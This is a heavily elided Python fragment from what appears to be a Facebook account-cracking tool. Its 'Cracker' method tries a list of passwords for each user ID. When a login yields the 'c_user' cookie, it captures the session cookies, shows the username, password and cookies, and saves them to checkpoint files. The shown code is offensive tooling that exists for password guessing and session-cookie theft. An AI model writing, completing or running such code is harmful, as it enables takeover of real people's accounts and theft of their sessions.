	...
	def Cracker(self, user, peweh, url_log):
		try:
			...
			for xyz_ in peweh:
				...
				if 'c_user' in cook:
					kukis = ";".join([key+"="+value for key, value in cook.items()])
					tree = Tree(" ")
					tree.add(f"{Te}{H}{user} ◊ {pw}")
					tree.add(f"{Te}{H}{kukis}")
					...
					check.append(f'{info}')
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {info}\n")
					self.cek_apk(user_agent,'[Checkpoint]: '+info)
					break
				else:
					continue
		...
		try:
			...
			for xyz_ in peweh:
				...
				if 'c_user' in cook:
					...
					check.append(f'{info}')
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {info}\n")
					self.cek_apk(uas,'[Checkpoint]: '+info)
					break
				else:
					continue
